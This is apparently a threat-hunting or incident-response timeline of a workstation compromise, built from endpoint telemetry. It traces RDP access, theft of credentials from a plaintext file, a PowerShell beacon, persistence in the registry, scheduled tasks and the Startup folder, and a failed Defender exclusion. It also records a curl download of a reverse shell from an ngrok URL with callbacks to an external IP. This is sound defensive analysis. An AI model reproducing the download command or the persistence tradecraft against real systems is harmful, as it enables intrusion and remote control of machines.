# CorpHealth Attack - Complete Timeline

**Case:** Hunt 001  
**Device:** CH-OPS-WKS02  
**Period:** November 23-30, 2025  
**Format:** UTC timestamps

---

## Timeline Overview

| Phase | Start Time | Duration | Summary |
|-------|-----------|----------|---------|
| Initial Access | 03:08:31 | ~2 min | External RDP logon, credential discovery |
| Reconnaissance | 03:08:45 | ~1-2 min | Network enumeration (ipconfig) |
| Credential Abuse | 03:10:00 | ~36 min | Switch to ops.maintenance account |
| Tool Deployment | 03:46:08 | ~2 min | PowerShell beacon script execution |
| Privilege Escalation | 03:47:21 | ~1 min | Token modification, ConfigAdjust |
| Data Staging | 03:48:15 | ~12 min | Create inventory CSV files |
| Persistence Creation | 03:50:00 | ~25 min | Scheduled tasks, Run keys, registry |
| Tool Transfer | 04:00:15 | ~5 min | Download revshell.exe via ngrok |
| C2 Establishment | 04:05:00 | ~5 min | Execute reverse shell, connection attempts |
| Final Persistence | 04:10:00 | ~5 min | Copy to Startup folder |
| Sustained C2 | Nov 23-30 | 7+ days | Continuous reconnection attempts |

---

## Detailed Timeline

### 2025-11-23 (Day 1 - Initial Compromise)

#### 03:08:31.1849379 🔴 INITIAL ACCESS
```
Event: Successful Logon
Type: RemoteInteractive (RDP)
Source IP: 104.164.168.17 (Vietnam)
Account: chadmin
Device: CH-OPS-WKS02
Remote Session Device: 对手 ("adversary")
Status: SUCCESS
```
**Significance:** External attacker gains interactive desktop access

---

#### 03:08:35 🟠 CREDENTIAL DISCOVERY
```
Event: File Access
Process: explorer.exe
Account: chadmin
Target: CH-OPS-WKS02 user-pass.txt
Action: File opened (read)
```
**Significance:** Attacker's FIRST action - accessing stored credentials

---

#### 03:08:45 🟡 NETWORK RECONNAISSANCE
```
Event: Process Execution
Process: ipconfig.exe
Account: chadmin
Purpose: Local network configuration discovery
```
**Significance:** Mapping network topology for lateral movement

---

#### 03:10:00 🔴 PRIVILEGED ACCOUNT ACCESS
```
Event: Account Switch
New Account: ops.maintenance (Local Administrator)
Method: Credentials from user-pass.txt
Remote Session: Same device/IP (对手 / 104.164.168.17)
```
**Significance:** Escalation to administrative privileges

---

#### 03:46:08.400686 🔴 C2 BEACON INITIATION
```
Event: Network Connection Attempt
Process: powershell.exe
Script: MaintenanceRunner_Distributed.ps1
Destination: 127.0.0.1:8080
Account: ops.maintenance
Status: Connection attempted
```
**Significance:** First malicious script execution, local C2 proxy

---

#### 03:47:21.8529749 🔴 PRIVILEGE ESCALATION
```
Event: ProcessPrimaryTokenModified
Process: powershell.exe (PID 4888)
Script: MaintenanceRunner_Distributed.ps1
Token SID: S-1-5-21-1605642021-30596605-784192815-1000
Event Type: ConfigAdjust
```
**Significance:** Token privilege modification for elevated access

---

#### 03:47:30 🟠 ENCODED POWERSHELL EXECUTION
```
Event: Process Execution
Process: powershell.exe -EncodedCommand [Base64]
Decoded: Write-Output 'token-6D5E4EE08227'
Account: ops.maintenance
```
**Significance:** Obfuscated command execution, token generation

---

#### 03:48:15 🔴 PRIMARY DATA STAGING
```
Event: File Created
Path: C:\ProgramData\Microsoft\Diagnostics\CorpHealth\inventory_6ECFD4DF.csv
SHA256: 7f6393568e414fc564dad6f49a06a161618b50873404503f82c4447d239f12d8
Purpose: System inventory export
```
**Significance:** Data collection for potential exfiltration

---

#### 03:49:30 🟠 SECONDARY STAGING FILE
```
Event: File Created
Path: C:\Users\ops.maintenance\AppData\Local\Temp\CorpHealth\inventory_tmp_6ECFD4DF.csv
SHA256: [Different from primary]
Purpose: Modified/filtered inventory data
```
**Significance:** Data transformation before exfiltration

---

#### 03:50:00 🔴 SCHEDULED TASK PERSISTENCE
```
Event: RegistryKeyCreated
Key: HKLM\...\Schedule\TaskCache\Tree\CorpHealth_A65E64
Task: CorpHealth_A65E64
Purpose: Automatic malicious script execution
Trigger: System startup / User logon
```
**Significance:** Persistent access mechanism

---

#### 03:52:00 🟠 EPHEMERAL RUN KEY PERSISTENCE
```
Event: RegistryValueSet
Key: HKCU\...\CurrentVersion\Run
Value: MaintenanceRunner
Duration: ~2 minutes (created then deleted)
```
**Significance:** Testing detection, short-lived persistence

---

#### 03:55:00 🔴 FAKE EVENT LOG SOURCE
```
Event: RegistryKeyCreated
Key: HKLM\SYSTEM\...\EventLog\Application\CorpHealthAgent
Purpose: Create fake event log source
```
**Significance:** Log manipulation preparation

---

#### 03:58:00 🟠 AV EXCLUSION ATTEMPT
```
Event: Modify Windows Defender Settings (FAILED)
Target: C:\ProgramData\Corp\Ops\staging
Purpose: Add folder to AV exclusion list
Result: Permission Denied
```
**Significance:** Attempt to weaken host defenses

---

#### 04:00:15 🔴 EXTERNAL TOOL DOWNLOAD
```
Event: Network Connection + File Download
Process: curl.exe
URL: https://unresuscitating-donnette-smothery.ngrok-free.dev/revshell.exe
Destination: C:\Users\ops.maintenance\Downloads\revshell.exe
Protocol: HTTPS
```
**Significance:** Reverse shell tool transfer via ngrok tunnel

---

#### 04:05:00 🔴 REVERSE SHELL EXECUTION
```
Event: Process Execution
Process: revshell.exe
Parent: explorer.exe
Account: ops.maintenance
Target: 13.228.171.119:11746 (AWS C2)
Status: Multiple connection attempts (ConnectionFailed)
```
**Significance:** Outbound C2 communication attempts

---

#### 04:10:00 🔴 STARTUP FOLDER PERSISTENCE
```
Event: File Copied
Source: C:\Users\ops.maintenance\Downloads\revshell.exe
Destination: C:\ProgramData\...\StartUp\revshell.exe
Effect: Auto-execution at any user logon
```
**Significance:** Final persistence mechanism

---

### 2025-11-23 to 2025-11-30 (Day 1-7 - Sustained Access)

#### Continuous Activity 🔴 C2 BEACONING
```
First Beacon: 2025-11-23T03:46:08.400686Z
Latest Success: 2025-11-30T01:03:17.6985973Z
Duration: 7+ days
Pattern: Periodic reconnection attempts
Local Proxy: 127.0.0.1:8080
External C2: 13.228.171.119:11746
```
**Significance:** Persistent C2 infrastructure, automated reconnection

---

## Attack Flow Summary
```
External IP (Vietnam)
    ↓
[RDP to CH-OPS-WKS02]
    ↓
chadmin account logon
    ↓
Access user-pass.txt
    ↓
Network recon (ipconfig)
    ↓
Switch to ops.maintenance (admin)
    ↓
Deploy MaintenanceRunner.ps1
    ↓
Localhost beacon (127.0.0.1:8080)
    ↓
Token modification (privilege escalation)
    ↓
Create staging files (inventory CSVs)
    ↓
Establish persistence (tasks, registry, startup)
    ↓
Download revshell.exe (ngrok tunnel)
    ↓
Execute reverse shell
    ↓
Beacon to AWS C2 (13.228.171.119:11746)
    ↓
Maintain access (7+ days)
```

---

## Key Observations

**Rapid Initial Progression:**
- 0 min: Initial access
- 2 min: Credential discovery
- 4 min: Network recon
- 38 min: First C2 beacon
- 60 min: Full persistence established

**Attacker Characteristics:**
- Professional tradecraft (ephemeral persistence, obfuscation)
- Patient (7+ days of sustained access)
- Stealthy (hiding in legitimate paths)
- Deliberate naming ("对手" = adversary)

**Detection Delays:**
- Low-severity initial alert
- Activity appeared operational at first
- ~24 hours to full investigation initiation

---

**Timeline Compiled By:** Cyril Thomas
**Date:** February 10, 2026  
**Source:** Microsoft Defender for Endpoint telemetry
